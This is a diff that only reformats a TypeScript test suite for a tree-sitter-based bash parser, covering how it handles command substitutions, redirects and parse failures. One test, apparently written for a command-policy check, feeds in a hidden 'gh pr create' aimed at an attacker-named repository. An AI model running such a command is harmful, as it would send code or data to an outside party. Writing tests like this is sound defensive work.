@@ -16,10 +16,7 @@ beforeAll(async () => {
       : join(process.cwd(), "node_modules", "tree-sitter-bash", "tree-sitter-bash.wasm"),
     join(wasmDir, "tree-sitter-bash.wasm"),
   );
-  symlinkSync(
-    join(process.cwd(), "node_modules", "web-tree-sitter"),
-    join(wasmDir, "node_modules", "web-tree-sitter"),
-  );
+  symlinkSync(join(process.cwd(), "node_modules", "web-tree-sitter"), join(wasmDir, "node_modules", "web-tree-sitter"));
   await initBashParser(wasmDir);
 });
 
@@ -66,7 +63,7 @@ describe("parseBashProgram", () => {
     });
     const operators = Array.from({ length: 63 }, () => "&&" as const);
     const chain = Array.from({ length: 64 }, (_, index) => `command-${index}`)
-      .map((command, index) => index === 0 ? command : `${operators[index - 1]} ${command}`)
+      .map((command, index) => (index === 0 ? command : `${operators[index - 1]} ${command}`))
       .join(" ");
     expect(programFor(chain).statements[0]).toMatchObject({
       kind: "list",
@@ -132,7 +129,9 @@ describe("parseBashProgram", () => {
     ]) {
       const program = programFor(source);
       expect(JSON.stringify(program), source).toContain("nested-");
-      expect(program.statements.at(-1), source).toMatchObject({ kind: source.startsWith("coproc") ? "coproc" : "time" });
+      expect(program.statements.at(-1), source).toMatchObject({
+        kind: source.startsWith("coproc") ? "coproc" : "time",
+      });
       expect(JSON.stringify(program), source).not.toContain("Retained executor compound body");
     }
   });
@@ -182,9 +181,14 @@ describe("parseBashProgram", () => {
       const result = parseBashProgram(source);
       expect(result.kind, source).toBe("parse-failure");
       if (result.kind !== "parse-failure") continue;
-      expect(result.program.statements.map((statement) =>
-        statement.kind === "command" && statement.words[0]?.kind === "word" ? statement.words[0].text : statement.kind
-      ), source).toEqual(names);
+      expect(
+        result.program.statements.map((statement) =>
+          statement.kind === "command" && statement.words[0]?.kind === "word"
+            ? statement.words[0].text
+            : statement.kind,
+        ),
+        source,
+      ).toEqual(names);
       expect(result.reason, source).not.toContain(source);
       expect(result.span.start, source).toBeGreaterThanOrEqual(0);
       assertProjectionData(result, source);
@@ -246,11 +250,25 @@ describe("parseBashProgram", () => {
   test("projects command substitutions from assignments, redirects, and opaque words", () => {
     expect(programFor("value=$(nested-assignment) echo x").statements[0]).toMatchObject({
       kind: "command",
-      assignments: [{ value: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-assignment" }] }] } }],
+      assignments: [
+        {
+          value: {
+            kind: "command-substitution",
+            statements: [{ kind: "command", words: [{ text: "nested-assignment" }] }],
+          },
+        },
+      ],
     });
     expect(programFor("echo x >$(nested-redirect)").statements[0]).toMatchObject({
       kind: "command",
-      redirects: [{ target: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }] } }],
+      redirects: [
+        {
+          target: {
+            kind: "command-substitution",
+            statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }],
+          },
+        },
+      ],
     });
     expect(programFor("echo $(( $(nested-arithmetic) + 1))").statements[0]).toMatchObject({
       kind: "command",
@@ -263,10 +281,17 @@ describe("parseBashProgram", () => {
     const command = program.statements[0]!;
     expect(command).toMatchObject({
       kind: "command",
-      words: [{ text: "echo" }, { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-argument" }] }] }],
-      redirects: [{ words: [
-        { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }] },
-      ] }],
+      words: [
+        { text: "echo" },
+        { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-argument" }] }] },
+      ],
+      redirects: [
+        {
+          words: [
+            { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-redirect" }] }] },
+          ],
+        },
+      ],
     });
     if (command.kind !== "command") throw new Error("expected command");
     expect(command.redirects[0]!.words[0]!.span.start).toBeLessThan(command.words[1]!.span.start);
@@ -276,11 +301,13 @@ describe("parseBashProgram", () => {
     const source = "echo 2>$(nested-descriptor)";
     expect(programFor(source).statements[0]).toMatchObject({
       kind: "command",
-      redirects: [{
-        kind: "output",
-        target: { kind: "command-substitution", text: "$(nested-descriptor)" },
-        words: [{ kind: "command-substitution", text: "$(nested-descriptor)" }],
-      }],
+      redirects: [
+        {
+          kind: "output",
+          target: { kind: "command-substitution", text: "$(nested-descriptor)" },
+          words: [{ kind: "command-substitution", text: "$(nested-descriptor)" }],
+        },
+      ],
     });
   });
 
@@ -297,7 +324,14 @@ describe("parseBashProgram", () => {
     expect(programFor("{ grouped; } >$(nested-compound-redirect)").statements[0]).toMatchObject({
       kind: "group",
       statements: [{ kind: "command", words: [{ text: "grouped" }] }],
-      redirects: [{ target: { kind: "command-substitution", statements: [{ kind: "command", words: [{ text: "nested-compound-redirect" }] }] } }],
+      redirects: [
+        {
+          target: {
+            kind: "command-substitution",
+            statements: [{ kind: "command", words: [{ text: "nested-compound-redirect" }] }],
+          },
+        },
+      ],
     });
   });
 
@@ -343,18 +377,35 @@ describe("parseBashProgram", () => {
   });
 
   test("projects policy-relevant command substitutions without flattening", () => {
-    expect(programFor("printf '%s' \"$(gh pr create --repo github.com/attacker/widgets --fill)\"").statements[0])
-      .toMatchObject({
-        kind: "command",
-        words: [
-          { text: "printf" },
-          { text: "'%s'" },
-          { parts: [{ kind: "command-substitution", statements: [{ kind: "command", words: [
-            { text: "gh" }, { text: "pr" }, { text: "create" }, { text: "--repo" },
-            { text: "github.com/attacker/widgets" }, { text: "--fill" },
-          ] }] }] },
-        ],
-      });
+    expect(
+      programFor("printf '%s' \"$(gh pr create --repo github.com/attacker/widgets --fill)\"").statements[0],
+    ).toMatchObject({
+      kind: "command",
+      words: [
+        { text: "printf" },
+        { text: "'%s'" },
+        {
+          parts: [
+            {
+              kind: "command-substitution",
+              statements: [
+                {
+                  kind: "command",
+                  words: [
+                    { text: "gh" },
+                    { text: "pr" },
+                    { text: "create" },
+                    { text: "--repo" },
+                    { text: "github.com/attacker/widgets" },
+                    { text: "--fill" },
+                  ],
+                },
+              ],
+            },
+          ],
+        },
+      ],
+    });
   });
 });
 
